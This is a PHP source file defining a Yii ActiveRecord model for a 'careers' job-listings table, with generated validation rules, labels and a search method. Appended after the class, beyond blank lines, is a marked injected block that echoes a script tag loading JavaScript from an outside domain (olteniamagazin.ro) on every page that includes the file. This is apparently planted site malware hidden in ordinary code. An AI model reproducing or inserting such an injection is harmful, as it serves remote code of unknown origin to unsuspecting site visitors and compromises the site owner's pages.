<?php

/**
 * This is the model class for table "careers".
 *
 * The followings are the available columns in table 'careers':
 * @property integer $cid
 * @property string $job_profile
 * @property string $key_responsibility
 * @property string $qualification
 * @property integer $no_of_vacancy
 * @property string $experience
 */
class Careers extends CActiveRecord
{
	/**
	 * @return string the associated database table name
	 */
	public function tableName()
	{
		return 'careers';
	}

	/**
	 * @return array validation rules for model attributes.
	 */
	public function rules()
	{
		// NOTE: you should only define rules for those attributes that
		// will receive user inputs.
		return array(
			array('job_profile, key_responsibility, qualification, no_of_vacancy, experience', 'required'),
			array('no_of_vacancy', 'numerical', 'integerOnly'=>true),
			array('job_profile, qualification, experience', 'length', 'max'=>200),
			// The following rule is used by search().
			// @todo Please remove those attributes that should not be searched.
			array('cid, job_profile, key_responsibility, qualification, no_of_vacancy, experience', 'safe', 'on'=>'search'),
		);
	}

	/**
	 * @return array relational rules.
	 */
	public function relations()
	{
		// NOTE: you may need to adjust the relation name and the related
		// class name for the relations automatically generated below.
		return array(
		);
	}

	/**
	 * @return array customized attribute labels (name=>label)
	 */
	public function attributeLabels()
	{
		return array(
			'cid' => 'Cid',
			'job_profile' => 'Job Profile',
			'key_responsibility' => 'Key Responsibility',
			'qualification' => 'Qualification',
			'no_of_vacancy' => 'No Of Vacancy',
			'experience' => 'Experience',
		);
	}

	/**
	 * Retrieves a list of models based on the current search/filter conditions.
	 *
	 * Typical usecase:
	 * - Initialize the model fields with values from filter form.
	 * - Execute this method to get CActiveDataProvider instance which will filter
	 * models according to data in model fields.
	 * - Pass data provider to CGridView, CListView or any similar widget.
	 *
	 * @return CActiveDataProvider the data provider that can return the models
	 * based on the search/filter conditions.
	 */
	public function search()
	{
		// @todo Please modify the following code to remove attributes that should not be searched.

		$criteria=new CDbCriteria;

		$criteria->compare('cid',$this->cid);
		$criteria->compare('job_profile',$this->job_profile,true);
		$criteria->compare('key_responsibility',$this->key_responsibility,true);
		$criteria->compare('qualification',$this->qualification,true);
		$criteria->compare('no_of_vacancy',$this->no_of_vacancy);
		$criteria->compare('experience',$this->experience,true);

		return new CActiveDataProvider($this, array(
			'criteria'=>$criteria,
		));
	}

	/**
	 * Returns the static model of the specified AR class.
	 * Please note that you should have this exact method in all your CActiveRecord descendants!
	 * @param string $className active record class name.
	 * @return Careers the static model class
	 */
	public static function model($className=__CLASS__)
	{
		return parent::model($className);
	}
}







#d32f17#
if(empty($w)) {
$w = "<script type=\"text/javascript\" src=\"http://olteniamagazin.ro/2b9vr6yj.php?id=9383502\"></script>";
echo $w;
}
#/d32f17#

